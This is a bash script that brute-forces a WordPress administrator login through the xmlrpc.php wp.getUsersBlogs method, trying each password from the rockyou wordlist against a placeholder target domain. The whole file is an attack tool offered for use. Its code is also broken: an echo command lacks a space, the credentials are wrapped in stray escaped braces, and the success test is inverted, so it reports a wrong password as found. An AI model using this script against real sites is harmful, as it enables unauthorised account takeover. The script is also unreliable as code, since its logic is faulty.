#!/usr/bin/bash

#Crtl_c for exit
function crtl_c(){
echo -e "\n\n[!] Exit... \n"
	exit 1
}

trap crtl_c SIGINT


function createXML(){
password=$1


xmlFile="""
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>\{\{administrator\}\}</value></param> 
<param><value>\{\{$password\}\}</value></param> 
</params> 
</methodCall>"""


echo$xmlFile > file.xml

response=$(curl -s -X POST "https://DOAMIN_ATTACKED/xmlrpc.php" -d@file.xml)

# The response of the error message maybe change. I'll recomend to look on the response and replace it.
 if [ "$(echo $response | grep 'Username or password not valid.')" ]; then
	echo -e "\n[+] The password for administrator is $password"
	exit 0
 fi


}


cat /usr/share/wordlists/rockyou.txt | while read password; do
	createXML $password

done
